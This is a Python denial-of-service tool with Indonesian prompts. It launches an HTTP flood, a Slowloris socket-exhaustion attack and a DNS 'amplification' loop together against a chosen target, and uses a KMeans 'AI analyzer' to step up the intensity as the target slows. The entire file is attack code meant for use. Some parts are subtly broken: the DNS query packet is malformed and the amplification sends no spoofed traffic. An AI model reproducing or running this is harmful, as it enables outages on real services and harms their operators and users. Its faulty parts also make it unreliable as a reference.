import asyncio
import socket
import threading
import time
from sklearn.cluster import KMeans
import numpy as np

# Prompt user for inputs
target = input("Masukan target URL/IP: ")
port = int(input("Masukan target port (default: 80): ") or 80)
dns_server = input("Masukan DNS server for amplification (default: 8.8.8.8): ") or "8.8.8.8"
dns_query = input("Masukan DNS query for amplification (e.g., 'example.com'): ")

# AI-Based Traffic Analyzer
response_times = []
adaptive_params = {"http_threads": 10, "slowloris_sockets": 50, "interval": 15}

def analyze_responses():
    if len(response_times) >= 5:  # Minimal data untuk clustering
        kmeans = KMeans(n_clusters=2).fit(np.array(response_times).reshape(-1, 1))
        clusters = kmeans.cluster_centers_.flatten()
        print(f"[AI Analyzer] Traffic patterns: {clusters}")
        
        # Adjust parameters dynamically based on server response
        if clusters[1] > 1:  # If response times increase significantly
            adaptive_params["http_threads"] += 5
            adaptive_params["slowloris_sockets"] += 10
            adaptive_params["interval"] = max(adaptive_params["interval"] - 1, 5)
        else:  # If server is handling traffic efficiently
            adaptive_params["http_threads"] = max(adaptive_params["http_threads"] - 2, 5)
            adaptive_params["slowloris_sockets"] = max(adaptive_params["slowloris_sockets"] - 5, 20)
            adaptive_params["interval"] = min(adaptive_params["interval"] + 1, 30)
        
        print(f"[AI Adjustments] {adaptive_params}")
        response_times.clear()  # Bersihkan data untuk iterasi berikutnya

# HTTP Flood Function
async def http_flood():
    while True:
        try:
            start_time = time.time()
            reader, writer = await asyncio.open_connection(target, port)
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
            writer.write(request.encode())
            await writer.drain()
            writer.close()
            await writer.wait_closed()
            response_times.append(time.time() - start_time)
            analyze_responses()
        except Exception as e:
            print(f"[HTTP Flood Error] {e}")

# Slowloris Function
async def slowloris():
    sockets = []
    try:
        for _ in range(adaptive_params["slowloris_sockets"]):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            sockets.append(s)
        
        while True:
            for s in sockets:
                try:
                    s.send("X-a: keep-alive\r\n".encode())
                    response_times.append(0.5)
                    analyze_responses()
                except:
                    sockets.remove(s)
                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.connect((target, port))
                    new_s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                    sockets.append(new_s)
            await asyncio.sleep(adaptive_params["interval"])
    except Exception as e:
        print(f"[Slowloris Error] {e}")

# DNS Amplification Function
def dns_amplification():
    try:
        dns_query_packet = (
            b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
            bytes(dns_query, "utf-8") + b"\x00\x00\x01\x00\x01"
        )
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(dns_query_packet, (dns_server, 53))
                print(f"Sent DNS amplification request to {dns_server}")
                time.sleep(0.1)
    except Exception as e:
        print(f"[DNS Amplification Error] {e}")

# Main function to execute attacks concurrently
async def main():
    tasks = []
    # Add HTTP Flood tasks
    for _ in range(adaptive_params["http_threads"]):
        tasks.append(http_flood())
    
    # Add Slowloris tasks
    tasks.append(slowloris())

    # Run DNS Amplification in a separate thread
    threading.Thread(target=dns_amplification).start()
    
    # Execute asyncio tasks
    await asyncio.gather(*tasks)

# Execute the script
if __name__ == "__main__":
    print("[*] Starting the attack...")
    asyncio.run(main())
